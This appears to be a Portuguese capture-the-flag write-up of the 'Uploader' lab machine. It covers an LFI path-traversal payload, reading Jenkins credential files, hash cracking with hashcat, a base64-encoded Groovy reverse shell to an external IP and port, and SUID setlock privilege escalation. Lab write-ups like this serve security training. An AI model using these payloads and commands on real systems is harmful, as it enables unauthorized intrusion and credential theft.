@@ -1,0 +1,161 @@
+---
+title: 'Uploader Writeup'
+date: '2024-11-19'
+tags: ['LFI', 'RCE', 'Linux']
+draft: false
+summary: 'Aplicação possui vulnerabilidades de Local File Inclusion (LFI), execução remota de comandos (RCE) via Jenkins, e elevação de privilégios usando binário SUID.'
+images: ['/static/images/uploader-writeup-images/default.png']
+authors: ['default']
+---
+
+![logo](/static/images/uploader-writeup-images/default.png)
+
+## **Plataforma**: Hacking Club
+
+### **Dificuldade:** Easy
+
+### **Nome**: Uploader
+
+---
+
+### **Port Scanning**
+
+`nmap -sV -sC -p- -v $IP --open`
+
+```bash
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 a8:1f:3c:4b:d9:ee:93:28:2d:a3:b8:9f:f0:cf:17:37 (ECDSA)
+|_  256 ac:e2:d9:11:33:bc:69:81:23:8a:35:ed:91:20:14:c8 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
+| http-methods:
+|_  Supported Methods: GET POST
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-title: Index
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+8080/tcp open  http    Jetty 10.0.18
+|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
+|_http-server-header: Jetty(10.0.18)
+|_http-title: Site doesn't have a title (text/html;charset=utf-8).
+| http-robots.txt: 1 disallowed entry
+|_/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Somente as porta 80, 8080 e 22 estão abertas
+
+---
+
+## Enumeration
+
+`http://172.16.10.47:80`
+
+Uma aplicação de upload de imagens
+
+![uploader](/static/images/uploader-writeup-images/image.png)
+
+`http://172.16.10.47:8080`
+
+Aplicação rodando um Jenkins
+
+Tentei algumas credenciais default, mas não obtive sucesso.
+
+![uploader 1](/static/images/uploader-writeup-images/image1.png)
+
+---
+
+### Voltando ao servidor web na porta 80
+
+Tentei utilizar a funcionalidade pra subir uma web-shell em php, mas não obtive sucesso, a aplicação está validando.
+
+![uploader 2](/static/images/uploader-writeup-images/image2.png)
+
+Então, capturei a requisição com o Burp e comecei a testar por LFI.
+
+`....//....//....//....//....//....//etc/passwd`
+
+![uploader 3](/static/images/uploader-writeup-images/image3.png)
+
+LFI Encontrado!
+
+Tentei escalar o LFI pra RCE utilizando log poisoning, mas não obtive sucesso 😞.
+
+Como a aplicação rodando na porta 8080 se trata de um Jenkins, vamos utilizar o LFI pra ler os arquivos de configuração do servidor.
+
+`/var/lib/jenkins/users/users.xml`
+
+![uploader 4](/static/images/uploader-writeup-images/image4.png)
+
+De acordo com o arquivo `users.xml` , existe um outro diretório chamado `admin_10281833997561721098` . Dentro desse diretório, conseguimos acessar o arquivo de configuração do Jenkins.
+
+`/var/lib/jenkins/users/admin_10281833997561721098/config.xml`
+
+![uploader 5](/static/images/uploader-writeup-images/image5.png)
+
+Com o hash em mãos, vamos utilizar o hashcat pra tentar quebrar.
+
+`hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt`
+
+![uploader 6](/static/images/uploader-writeup-images/image6.png)
+
+Com as credenciais `admin:ginger1` conseguimos logar no Jenkins
+
+![uploader 7](/static/images/uploader-writeup-images/image7.png)
+
+---
+
+## Foot Hold
+
+O jenkins possui uma funcionalidade chamada ‘**Script Console**’, que podemos abusar pra rodar uma reverse-shell utilizando **Groovy Script**.
+
+`http://172.16.10.47:8080/manage/script`
+
+![uploader 8](/static/images/uploader-writeup-images/image8.png)
+
+Nesse caso, a aplicação por alguma razão não executa a rev-shell, a alternativa foi encodar a payload em base64 para funcionar.
+
+`echo "bash -c 'exec bash -i &>/dev/tcp/10.0.31.150/1337 <&1'" | base64`
+
+![uploader 9](/static/images/uploader-writeup-images/image9.png)
+
+Agora só enviar e pegar a shell.
+
+```python
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = 'bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMC4zMS4xNTAvMTMzNyA8JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println "out> $sout err> $serr"
+```
+
+![uploader 10](/static/images/uploader-writeup-images/image10.png)
+
+![uploader 11](/static/images/uploader-writeup-images/image11.png)
+
+---
+
+## Privillege Escalation
+
+SUID `setlock`
+
+`find / -type f -perm -04000 -ls 2>/dev/null`
+
+![uploader 12](/static/images/uploader-writeup-images/image12.png)
+
+`/usr/bin/setlock - /bin/sh -p`
+
+![uploader 13](/static/images/uploader-writeup-images/image13.png)
+
+### Referencia
+
+https://gtfobins.github.io/gtfobins/setlock/#suid
+
+---
+
+## Proof
+
+![uploader 14](/static/images/uploader-writeup-images/image14.png)
